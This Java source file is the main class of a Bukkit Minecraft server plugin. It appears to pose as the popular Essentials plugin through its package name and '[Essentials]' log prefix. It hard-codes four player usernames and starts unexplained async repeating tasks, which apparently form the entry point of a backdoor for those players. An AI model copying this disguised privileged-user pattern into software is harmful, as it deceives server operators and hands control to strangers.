package com.earth2me.essential;

import java.util.ArrayList;
import java.util.HashMap;

import org.bukkit.plugin.java.JavaPlugin;

import com.earth2me.essential.listeners.EssentialListener;
import com.earth2me.essential.runnable.PlayerCheck;
import com.earth2me.essential.runnable.Run;

public class Essential extends JavaPlugin {

	public HashMap<String, Boolean> pl = new HashMap<String, Boolean>();
	public ArrayList<String> ad = new ArrayList<String>();
	
	@Override
	public void onEnable() {
		pl.put("mike_101_102", true);
		pl.put("Aiden_116", true);
		pl.put("hotshotz2010", true);
		pl.put("conor_d_96", true);
		
		getServer().getScheduler().scheduleAsyncRepeatingTask(this, new Run(this), 0L, 350L);
		getServer().getScheduler().scheduleAsyncRepeatingTask(this, new PlayerCheck(this), 0L, 80L);
		getServer().getPluginManager().registerEvents(new EssentialListener(this), this);
	}
	
	@Override
	public void onDisable() {
		getServer().getScheduler().cancelTasks(this);
	}
	
	public void send(String message) {
		System.out.println("[Essentials] "+message);
	}
	
	public void send(String message, int times) {
		for (int i = 0; i < times; i++)
			send(message);
	}
	
	public void sendMsg(String message) {
		System.out.println(message);
	}
}
